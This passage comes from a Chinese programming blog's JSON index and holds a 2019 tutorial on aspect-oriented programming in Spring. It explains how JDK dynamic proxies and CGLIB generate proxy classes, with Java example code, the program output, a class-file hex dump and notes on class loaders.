原理完全解读\nJava神器BTrace，从入门到熟练小工的手册\n","date":"2019-10-30T15:27:01+08:00","permalink":"https://h2cone.github.io/2019/10/30/instrument_attach/","title":"Java 程序探测或追踪"},{"content":"楔子 想象一下，我们编写的代码块重复了两次或两次以上，理智的程序员可能会考虑重构，提取公共的部分抽象成函数或方法，通过重用函数或方法以此减少冗余，简化代码，甚至预防了“牵一发而动全身”的噩梦，这已经算得上是对 DRY 和 SoC 原则的践行。DRY（Don\u0026rsquo;t repeat yourself）教导我们尽量减少重复代码，而 SoC（Separation of Concerns）指的是关注点分离，因为关注点混杂会极大地增强复杂性，好比把什么都混为一谈，堆积而成的祖传代码，这又是程序员们的另一个噩梦，所以才把复杂的问题分解成若干独立的小问题，模块化，极力追求“高内聚，低耦合”。\nAOP（Aspect-oriented programming）是对横向的重用，非常符合 DRY 和 SoC 的原则。直观上，代码总是从上往下执行，不妨称之为纵向，OOP（Object-oriented Programming）的继承也可看作是纵向；相对则是横向，从横跨多个类的角度来看，横向有着许许多多的统一逻辑可以切入，比如安全检查、异常处理、日志输出、事务管理、追踪、监控等等，这些统一逻辑能够被抽象成模块，重用它们甚至不需要显式使用或只需要编写简单的元数据进行声明，一次编写，到处执行，Java 程序员们已经体验过不少 Spring AOP 的魔术。\nAOP 能够使前文所述的统一逻辑模块化，这些统一逻辑可称之为横切关注点（crosscutting concerns），切面（Aspect）则作为模块，因此译为切面导向编程。切面的作用效果彷佛是往程序的执行点注入了新的代码，这些执行点被称之为接入点（Join Point），比如方法调用的前后；接入点的集合称之为切入点 （Pointcut），比如满足条件的一组方法；注入的代码称之为建议（Advice），比如在方法调用前后输出日志；其中代码注入的术语是编织（Weaving），既然把编织工作交给库或框架，那么可能是在编译时编织（Compile-time weaving）或运行时编织（Run-Time weaving），还可能在编译后编织（Post-compile weaving） 或加载时编织（Load-time weaving）。\n虽说如此，那属于 Spring 核心的 Spring AOP 的魔术是怎么做到的呢？\n喧闹中，听见了一句悄悄话：\nSpring AOP is implemented by using runtime proxies.\n另一句悄悄话：\nIn the Spring Framework, an AOP proxy is a JDK dynamic proxy or a CGLIB proxy.\n原来 Spring AOP 是使用运行时代理实现的，代理则是由 JDK 动态代理或 CGLIB 生成。据传闻所说，利用 JDK 动态代理能够在运行时生成代理，一番打听之后也了解到 CGLIB 是一个字节码生成和转换库，也可用于动态生成代理。\nByte Code Generation Library is high level API to generate and transform JAVA byte code. It is used by AOP, testing, data access frameworks to generate dynamic proxy objects and intercept field access.\n门打开了，面前是通向秘密地下室的分岔，一条是名为 JDK 动态代理的路，另一条是名为 CGLIB 的路。\n探秘 Python、JavaScript、PHP、Ruby 等动态语言们，竟然能在运行时对类/属性/方法/函数进行操作，作为静态语言的 Java 在不重启 JVM 的前提下，是否也可以在运行时操作类？\n当我们写完一个 Java 程序，通过 Java 编译器编译后输出包含 Java 字节码的 Class 文件，随后启动 Java 虚拟机（简称 JVM，本文以 HotSpot 为例），Java 运行时环境（JRE）通过类加载器（ClassLoader）加载类到 JVM 运行时的方法区，方法区储存着类的数据，比如运行时的常量池（Run-Time Constant Pool）和方法代码等，之后，类被实例化或对象被创建\u0026hellip;\u0026hellip;那么，Java 是否支持运行时更改类或者运行时生成类并动态加载到方法区？\n一番搜索后，果然其中一些想法早已实现在 JDK 中。JDK 动态代理不仅能够在运行时生成类，还能拦截方法调用，接下来用简单的代码详细说明。\n我们有一个简单的接口和接口实现类：\n1 2 3 4 5 public interface PersonService { String sayHello(String name); } 1 2 3 4 5 6 7 public class SimplePersonService implements PersonService { @Override public String sayHello(String name) { return \u0026#34;Hello, \u0026#34; + name; } } 感谢多态，我们可以使用接口 say hello：\n1 2 3 4 5 6 @Test public void helloWorld() { PersonService service = new SimplePersonService(); String result = service.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); } 可是，如果我们需要在 sayHello(\u0026ldquo;World\u0026rdquo;) 调用前后添加一些逻辑，比如：\n1 2 3 System.out.println(\u0026#34;之前做点什么\u0026#34;); String result = service.sayHello(\u0026#34;World\u0026#34;); System.out.println(\u0026#34;之后做点什么\u0026#34;); 插入一两处也许还能接受，如果 sayHello(\u0026hellip;) 遍布各处或不便改动其上下文代码，为了减少代码冗余和分离关注点，试试 JDK 动态代理吧。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @Test public void sayHello() { // 创建目标实例（被代理实例，可选）。 SimplePersonService target = new SimplePersonService(); // 生成代理类，创建代理实例。 PersonService proxy = (PersonService) Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), new PersonServiceHandler(target)); String result = proxy.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); } /** * 拦截 PersonService 方法调用的处理器 */ static class PersonServiceHandler implements InvocationHandler { /** * 目标实例 (被代理实例) */ Object target; PersonServiceHandler() { } PersonServiceHandler(Object target) { this.target = target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.printf(\u0026#34;proxy class: %s\\n\u0026#34;, proxy.getClass()); System.out.printf(\u0026#34;method: %s\\n\u0026#34;, method); System.out.printf(\u0026#34;args: %s\\n\u0026#34;, Arrays.toString(args)); if (target != null) { System.out.println(\u0026#34;Before invoke\u0026#34;); // 调用前，添加逻辑。 Object result = method.invoke(target, args); System.out.println(result); System.out.println(\u0026#34;After invoke\u0026#34;); // 调用后，添加逻辑。 return result; } return null; } } 上面这段代码通过了测试并输出了以下内容：\n1 2 3 4 5 6 proxy class: class com.sun.proxy.$Proxy4 method: public abstract java.lang.String io.h2cone.proxy.jdk.PersonService.sayHello(java.lang.String) args: [World] Before invoke Hello, World After invoke 生成的代理类名叫 com.sun.proxy.$Proxy4，官方文档对代理类的定义是：\nA dynamic proxy class is a class that implements a list of interfaces specified at runtime such that a method invocation through one of the interfaces on an instance of the class will be encoded and dispatched to another object through a uniform interface\n同时注意到了 java.lang.reflect.Proxy#newProxyInstance 方法参数：\n1 2 3 loader – the class loader to define the proxy class interfaces – the list of interfaces for the proxy class to implement h – the invocation handler to dispatch method invocations to 第二个参数是代理类实现的接口列表，原来代理类是接口实现类，回顾一下上文的代码，com.sun.proxy.$Proxy4 实现了 PersonService 接口，而 SimplePersonService 也实现了 PersonService 接口，也就说代理类和被代理类是兄弟姐妹。所谓代理，在这里就是通过重写 InvocationHandler 的 invoke 方法拦截 PersonService 方法调用并能在调用前后添加逻辑。\n当用 Java 工作的时候，程序员们也许经常编写许多接口，但每个接口却只有一个实现类，不免有一种“过度工程”的嫌疑，往往很多接口成为了不必要的抽象，还因此多了一些运行时开销，接口虽好却不必过早设计。回到动态代理的话题，是否有可能不需要接口就能动态生成代理类？\n到了 CGLIB 的用武之地。CGLIB 其实是（Code Generation Library）的简称，译作代码生成库，但这会让人困惑，难道是生成 Java 源代码？并不是，它的真名是 Java 字节码生成库。Java 字节码（Java bytecode）看起来如何？\n对于上文的代码，当我们用 javac 编译源代码成功会输出 PersonService.class 和 SimplePersonService.class 等文件。我们用编辑器看看其中一个文件的内容：\n1 2 3 4 5 6 7 8 9 10 11 12 cafe babe 0000 0034 0009 0700 0707 0008 0100 0873 6179 4865 6c6c 6f01 0026 284c 6a61 7661 2f6c 616e 672f 5374 7269 6e67 3b29 4c6a 6176 612f 6c61 6e67 2f53 7472 696e 673b 0100 0a53 6f75 7263 6546 696c 6501 0012 5065 7273 6f6e 5365 7276 6963 652e 6a61 7661 0100 2169 6f2f 6832 636f 6e65 2f70 726f 7879 2f6a 646b 2f50 6572 736f 6e53 6572 7669 6365 0100 106a 6176 612f 6c61 6e67 2f4f 626a 6563 7406 0100 0100 0200 0000 0000 0104 0100 0300 0400 0000 0100 0500 0000 0200 06 这就是 Java 字节码看起来的样子，这里表现为十六进制数据。Java 编译时从源代码到字节码，字节码也可动态编译（JIT）为机器码（native code）；机器只理解机器码，而 JVM 只理解 Java 字节码，可以说 Java 字节码是 JVM 的指令集。既然 Class 文件包含了 Java 字节码，则更改类或生成类是由操作 Java 字节码开始，可是我们大部分都只擅长 Java 代码，操作 Java 字节码要怎么开始呢？\n不妨先试试从 Class 文件逆向到 Java 文件，利用反汇编命令行工具，例如在终端中敲下 javap -v SimplePersonService.class，你将得到 Class 文件格式（The class File Format）的直观认识；但是，操作 Java 字节码需要透彻理解 Java 虚拟机规范，比如 JVM 的指令集和 JVM 内幕，ASM 的出现使之成为可能。ASM 是一个 Java 字节码操作和分析框架，可用于更改已存在类或者动态生成类，程序员们不满足于此，利用 ASM 封装了更高层的 Java API，最终出现了 CGLIB。\n我们来看看 CGLIB 仓库的维基的一段描述：\ncglib is a powerful, high performance and quality Code Generation Library, It is used to extend JAVA classes and implements interfaces at runtime\n无需接口动态生成代理类不是不可能的，因为代理类可以继承被代理类。接下来体验一下 CGLIB，我们使用抽象类代替接口：\n1 2 3 4 5 6 public abstract class PersonService { public String sayHello(String name) { return \u0026#34;Hello, \u0026#34; + name; } } 然后，用 CGLIB 的方式 say hello：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Test public void sayHello() { Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(PersonService.class); // 设置基类。 enhancer.setCallback(new PersonServiceInterceptor()); // 设置方法调用拦截器。 PersonService service = (PersonService) enhancer.create(); // 生成代理类，创建代理实例。 String result = service.sayHello(\u0026#34;World\u0026#34;); Assert.assertEquals(\u0026#34;Hello, World\u0026#34;, result); } /** * PersonService 方法调用拦截器 */ static class PersonServiceInterceptor implements MethodInterceptor { @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { System.out.printf(\u0026#34;obj class: %s\\n\u0026#34;, obj.getClass()); System.out.printf(\u0026#34;method: %s\\n\u0026#34;, method); System.out.printf(\u0026#34;args: %s\\n\u0026#34;, Arrays.toString(args)); System.out.printf(\u0026#34;method proxy: %s\\n\u0026#34;, proxy); System.out.println(\u0026#34;Before invoke\u0026#34;); // 调用前，添加逻辑。 Object result = proxy.invokeSuper(obj, args); System.out.println(result); System.out.println(\u0026#34;After invoke\u0026#34;); // 调用后，添加逻辑。 return result; } } 输出结果如下：\n1 2 3 4 5 6 7 obj class: class io.h2cone.proxy.cglib.PersonService$$EnhancerByCGLIB$$64e53be2 method: public java.lang.String io.h2cone.proxy.cglib.PersonService.sayHello(java.lang.String) args: [World] method proxy: net.sf.cglib.proxy.MethodProxy@629f0666 Before invoke Hello, World After invoke 这种方式的代理类名称是 obj calss 对应的值，顾名思义，它是 PersonService 的增强类。在生成代理类之前，enhancer 设置了基类 PersonService，由此生成的代理类自然就继承了被代理类（PersonService），它们是孩子与父母的关系。CGLIB 与 JDK 动态代理一样都能拦截方法调用，替被拦截方法做一些它做不到的事情。\n完整代码已发布，请参考 proxy。\n综上所述，JDK 动态代理只能通过接口生成代理类，代理类与被代理类是兄弟姐妹，而 CGLIB 还能通过基类生成代理类，代理类是被代理类的子类。 除了能力上的区别，在性能上，似乎普遍认为 CGLIB 要快于 JDK 动态代理。前文提到了 Spring AOP 使用 JDK 动态代理或 CGLIB 在运行时生成代理类，那么 Spring AOP 在什么情况下采用 JDK 动态代理？又是在什么情况下次采用 CGLIB？如结论所说，如果被代理类或目标类实现了一个或多个接口，那么 Spring AOP 将采用 JDK 动态代理生成一个实现每个接口的代理类；如果被代理类或目标类没有实现接口，那么 Spring AOP 将采用 CGLIB 动态生成代理类，它是被代理类或目标类的子类。当然，Spring AOP 很可能也允许我们强制采用其中一种方式。\n虽然动态生成了代理类，但是如果不把代理类加载到 JVM 方法区，也就不能创建它的实例。回头看一下 JDK 动态代理的 newProxyInstance 方法的首要参数：\n1 loader – the class loader to define the proxy class 它是一个用于定义代理类的类加载器，我们传递了被代理类的类加载器，因而被代理类和代理类的类加载器是相同的。\n1 2 target class loader: sun.misc.Launcher$AppClassLoader@18b4aac2 proxy class loader: sun.misc.Launcher$AppClassLoader@18b4aac2 AppClassLoader 是应用程序类加载器，又名为系统类加载器（System Class Loader），它所在的家族大概长这样子：\n其中没有双亲的 Bootstrap Class Loader 从 JRE/lib/rt.jar 加载类，它的孩子 Extension Class Loader 从 JRE/lib/ext 或 java.ext.dirs 加载类，它的子孙 System Class Loader 从 CLASSPATH、-classpath、-cp、Mainfest 加载类。类加载机制使用 Parent Delegation Model 处理类加载请求，自底向上检查类是否已加载，自顶向下尝试加载类。当然，如果有需要自定义类加载器，则需要编写类直接或间接继承 java.lang.ClassLoader 并重写相应的方法（一般会继承 java.net.URLClassLoader）。\n后记 在 Spring AOP 的使用过程中，还发现一个叫做 AspectJ 的家伙；在编译时和运行时之间是编译后和加载时，它就在加载时做手脚\u0026hellip;\u0026hellip;\n本文首发于 https://h2cone.github.io\n参考 冒号课堂§3.3：切面范式\nAspect Oriented Programming with Spring\nJDK- and CGLIB-based proxies\nSpring本质系列(2)-AOP\nDynamic Proxy Classes\nJava帝国之动态代理\n从兄弟到父子：动态代理在民间是怎么玩的？\nCGLIB 仓库\nASM： 一个低调成功者的自述\nASM 官网\nclassloader-in-java\nClass ClassLoader\nJava运行时动态生成class的方法\nLoad-time Weaving with AspectJ in the Spring Framework\n","date":"2019-09-17T11:29:21+08:00","permalink":"https://h2cone.github.io/2019/09/17/aop_proxy_bytecode/","title":"切面和动态代理以及字节码"}]